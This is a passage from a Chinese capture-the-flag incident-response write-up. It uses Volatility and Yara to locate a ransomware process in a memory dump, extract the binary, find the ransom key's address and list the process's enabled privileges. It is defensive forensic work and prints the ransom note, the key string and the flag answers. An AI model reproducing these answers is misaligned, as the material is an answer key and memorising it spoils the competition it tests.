class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>基于已知明文，可以定位到相关进程</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 yarascan -Y "Your computers and servers are encrypted"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Rule: r1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Owner: Process SearchProtocol Pid 4036</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dcc5  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dcd5  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dce5  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dcf5  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd05  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd15  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd25  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd35  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd45  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd55  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd65  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd75  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd85  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dd95  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976dda5  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079976ddb5  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Rule: r1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Owner: Process SearchProtocol Pid 4036</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977314d  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977315d  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977316d  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977317d  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977318d  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977319d  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731ad  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731bd  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731cd  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731dd  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731ed  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x207997731fd  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977320d  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977321d  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977322d  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x2079977323d  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Rule: r1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Owner: Process svchost.exe Pid 5784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a10d  59 6f 75 72 20 63 6f 6d 70 75 74 65 72 73 20 61   Your.computers.a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a11d  6e 64 20 73 65 72 76 65 72 73 20 61 72 65 20 65   nd.servers.are.e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a12d  6e 63 72 79 70 74 65 64 2c 20 62 61 63 6b 75 70   ncrypted,.backup</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a13d  73 20 61 72 65 20 64 65 6c 65 74 65 64 2e 20 57   s.are.deleted..W</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a14d  65 20 75 73 65 20 73 74 72 6f 6e 67 20 65 6e 63   e.use.strong.enc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a15d  72 79 70 74 69 6f 6e 20 61 6c 67 6f 72 69 74 68   ryption.algorith</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a16d  6d 73 2c 20 73 6f 20 79 6f 75 20 63 61 6e 6e 6f   ms,.so.you.canno</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a17d  74 20 64 65 63 72 79 70 74 20 79 6f 75 72 20 64   t.decrypt.your.d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a18d  61 74 61 2e 20 0d 0a 20 42 75 74 20 79 6f 75 20   ata.....But.you.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a19d  63 61 6e 20 72 65 73 74 6f 72 65 20 65 76 65 72   can.restore.ever</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1ad  79 74 68 69 6e 67 20 62 79 20 70 75 72 63 68 61   ything.by.purcha</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1bd  73 69 6e 67 20 61 20 73 70 65 63 69 61 6c 20 70   sing.a.special.p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1cd  72 6f 67 72 61 6d 20 66 72 6f 6d 20 75 73 20 2d   rogram.from.us.-</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1dd  20 75 6e 69 76 65 72 73 61 6c 20 64 65 63 72 79   .universal.decry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1ed  70 74 6f 72 2e 20 54 68 69 73 20 70 72 6f 67 72   ptor..This.progr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a1fd  61 6d 20 77 69 6c 6c 20 72 65 73 74 6f 72 65 20   am.will.restore.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>排除掉正常系统服务，即可确定到 <code>Process svchost.exe Pid 5784</code> 为恶意进程</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="思路二-对磁盘非常规文件进行排查">思路二 对磁盘非常规文件进行排查<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E5%AF%B9%E7%A3%81%E7%9B%98%E9%9D%9E%E5%B8%B8%E8%A7%84%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E6%8E%92%E6%9F%A5" class="hash-link" aria-label="思路二 对磁盘非常规文件进行排查的直接链接" title="思路二 对磁盘非常规文件进行排查的直接链接">​</a></h3>
<p>使用 <code>R-Studio</code> 对内存中的 NTFS 结构数据库进行分析，找到 <code>F:\Users\skills\svchost.exe</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241231-123152-70223958fb0b713bde30bf1fa94bbff7.png" width="1911" height="1386" class="img_ev3q"></p>
<p>常规情况下，文件 <code>svchost.exe</code> 不会存在于用户目录中，可以确定为可疑文件</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="思路三-使用-yara-进行匹配分析">思路三 使用 Yara 进行匹配分析<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E6%80%9D%E8%B7%AF%E4%B8%89-%E4%BD%BF%E7%94%A8-yara-%E8%BF%9B%E8%A1%8C%E5%8C%B9%E9%85%8D%E5%88%86%E6%9E%90" class="hash-link" aria-label="思路三 使用 Yara 进行匹配分析的直接链接" title="思路三 使用 Yara 进行匹配分析的直接链接">​</a></h3>
<p><a href="https://github.com/ufrisk/MemProcFS" target="_blank" rel="noopener noreferrer">MemProcFS</a> 自带了一份 Malware Yara 匹配规则表，可以直接使用</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241201-130121-da8a16b26cfc50a254008d8e76ed0b70.png" width="1059" height="408" class="img_ev3q"></p>
<p>Volatility 的话，可以使用 <a href="https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9" target="_blank" rel="noopener noreferrer">Simple python script for merging malware yara rules from https://github.com/Yara-Rules/rules</a> 将 Yara 官方规则库，以及一些增强型 Yara 规则库，进行合并之后进行加载，也可以定位到恶意进程</p>
<p>综上，都可以定位到恶意软件的信息，其文件路径为 <code>F:\Users\skills\svchost.exe</code> 进程信息为 <code>Process svchost.exe Pid 5784</code></p>
<p>将可执行文件进行提取</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 dumpfiles --regex "skills\\svchost\.exe" -D .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ImageSectionObject 0xffff9a88056a9ef0   5784   \Device\HarddiskVolume3\Users\skills\svchost.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DataSectionObject 0xffff9a88056a9ef0   5784   \Device\HarddiskVolume3\Users\skills\svchost.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以得到文件 <code>file.5784.0xffff9a8805ed2010.dat</code></p>
<p>对 <code>file.5784.0xffff9a8805ed2010.dat</code> 查看其 PE 文件信息</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241235-143503-798c123684ee42e0e8220e3da3b7dde3.png" width="1898" height="1101" class="img_ev3q"></p>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">calimalimodumator.exe</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---04">威胁分析 - 04<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---04" class="hash-link" aria-label="威胁分析 - 04的直接链接" title="威胁分析 - 04的直接链接">​</a></h2>
<blockquote>
<p>逆向分析恶意软件时，确定其在进程内存中存储关键数据的位置，对于理解其工作机制和防范进一步的攻击非常重要。</p>
<p>请问，恶意软件在进程内存中存储密钥的内存地址是什么？（请将答案编辑并存入 <code>/opt/wxfx/answer/4.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<p>在上文中，已经在内存中找到了恶意软件的勒索信息</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">When you open our website, put the following data in the input form:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Key:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsJTyyTnzJlGQ1I6sfwV6oVcXaRynwN6mWphA7BKXEDIHJcDlhNNHsrxlkpggRChK2nQ7wP0sknJvl37lbqElTopkUywK3QnfJFmqDBSCmFISeWSudjgwxB4kKSp7h4VySHeu4LmDiZXTAh1dbZHWxTtZ0bA6PhCoDrbGkctY4rucITW4IdYUZJC8d2B7SFnr5EA7EoRkajrZW54brM5Kgwqsz67qzH6Hk0Vr3EDcnGzNjGQBapJczIWkgPtMCJdTkeemQ34XH7wawXu3eOGV3uJlBZNoSuaxtDHMGApS8EWsUXhafMW8WxFLAPLCo6pdm7MLcLsVDp9iBXU1sLv2KkGyUJbO0KOmom9f1JREuidviHRfsndEgMFBAjyq5v4VEIraiioAbtWM7eecYaXPVt3rolsBi8mtjxLOpFj73NPPitoIDxBNfHGzXxvRTXi06Pjx9pRnAtjIqoq5wovnHa8uBel8nq8yDJTk7NWdGdsv3yVwV2TmBin7OvFqHN9lweFNJyuziKCVGEtSaglUNudMmpFnNObGlhfh58jQsrQiQZ2d3AOFsi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>使用 <code>yarascan</code> 进行检索</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 yarascan -Y "lsJTyyTnzJlGQ"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Rule: r1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Owner: Process svchost.exe Pid 5784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a585  6c 73 4a 54 79 79 54 6e 7a 4a 6c 47 51 31 49 36   lsJTyyTnzJlGQ1I6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a595  73 66 77 56 36 6f 56 63 58 61 52 79 6e 77 4e 36   sfwV6oVcXaRynwN6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5a5  6d 57 70 68 41 37 42 4b 58 45 44 49 48 4a 63 44   mWphA7BKXEDIHJcD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5b5  6c 68 4e 4e 48 73 72 78 6c 6b 70 67 67 52 43 68   lhNNHsrxlkpggRCh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5c5  4b 32 6e 51 37 77 50 30 73 6b 6e 4a 76 6c 33 37   K2nQ7wP0sknJvl37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5d5  6c 62 71 45 6c 54 6f 70 6b 55 79 77 4b 33 51 6e   lbqElTopkUywK3Qn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5e5  66 4a 46 6d 71 44 42 53 43 6d 46 49 53 65 57 53   fJFmqDBSCmFISeWS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a5f5  75 64 6a 67 77 78 42 34 6b 4b 53 70 37 68 34 56   udjgwxB4kKSp7h4V</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a605  79 53 48 65 75 34 4c 6d 44 69 5a 58 54 41 68 31   ySHeu4LmDiZXTAh1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a615  64 62 5a 48 57 78 54 74 5a 30 62 41 36 50 68 43   dbZHWxTtZ0bA6PhC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a625  6f 44 72 62 47 6b 63 74 59 34 72 75 63 49 54 57   oDrbGkctY4rucITW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a635  34 49 64 59 55 5a 4a 43 38 64 32 42 37 53 46 6e   4IdYUZJC8d2B7SFn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a645  72 35 45 41 37 45 6f 52 6b 61 6a 72 5a 57 35 34   r5EA7EoRkajrZW54</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a655  62 72 4d 35 4b 67 77 71 73 7a 36 37 71 7a 48 36   brM5Kgwqsz67qzH6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a665  48 6b 30 56 72 33 45 44 63 6e 47 7a 4e 6a 47 51   Hk0Vr3EDcnGzNjGQ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a675  42 61 70 4a 63 7a 49 57 6b 67 50 74 4d 43 4a 64   BapJczIWkgPtMCJd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>即可确定答案</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">0x00d1a585</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="威胁分析---05">威胁分析 - 05<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024wdb-Semis%20IncidentResponse-threat%20analysis#%E5%A8%81%E8%83%81%E5%88%86%E6%9E%90---05" class="hash-link" aria-label="威胁分析 - 05的直接链接" title="威胁分析 - 05的直接链接">​</a></h2>
<blockquote>
<p>分析恶意软件的行为包括了解其在系统中启用了哪些权限，这有助于评估其潜在的危害和攻击范围。通过检查进程的权限列表，可以发现其可能执行的敏感操作。</p>
<p>请问，恶意软件在其进程中启用了多少个权限？（请将答案编辑并存入 <code>/opt/wxfx/answer/5.txt</code> 文件中，参考 <code>/opt/wxfx/example</code> 目录）</p>
</blockquote>
<p>已知恶意程序的进程信息为 <code>Process svchost.exe Pid 5784</code> 的情况下，查看进程权限信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS D:\Downloads\attachment\attachment&gt; .\volatility_2.6_win64_standalone.exe -f .\dump.mem --profile=Win10x64_14393 privs -p 5784</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Volatility Foundation Volatility Framework 2.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pid      Process          Value  Privilege                            Attributes               Description</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-------- ---------------- ------ ------------------------------------ ------------------------ -----------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           2 SeCreateTokenPrivilege                                        Create a token object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           3 SeAssignPrimaryTokenPrivilege                                 Replace a process-level token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           4 SeLockMemoryPrivilege                                         Lock pages in memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           5 SeIncreaseQuotaPrivilege             Present,Enabled          Increase quotas</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           6 SeMachineAccountPrivilege                                     Add workstations to the domain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           7 SeTcbPrivilege                                                Act as part of the operating system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           8 SeSecurityPrivilege                  Present,Enabled          Manage auditing and security log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe           9 SeTakeOwnershipPrivilege             Present,Enabled          Take ownership of files/objects</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          10 SeLoadDriverPrivilege                Present,Enabled          Load and unload device drivers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          11 SeSystemProfilePrivilege             Present,Enabled          Profile system performance</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          12 SeSystemtimePrivilege                Present,Enabled          Change the system time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          13 SeProfileSingleProcessPrivilege      Present,Enabled          Profile a single process</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          14 SeIncreaseBasePriorityPrivilege      Present,Enabled          Increase scheduling priority</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          15 SeCreatePagefilePrivilege            Present,Enabled          Create a pagefile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          16 SeCreatePermanentPrivilege                                    Create permanent shared objects</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          17 SeBackupPrivilege                    Present,Enabled          Backup files and directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          18 SeRestorePrivilege                   Present,Enabled          Restore files and directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          19 SeShutdownPrivilege                  Present,Enabled          Shut down the system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          20 SeDebugPrivilege                     Present,Enabled          Debug programs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    5784 svchost.exe          21 SeAuditPrivilege                                              Generate security audits</span><br></span><span class="token-line" 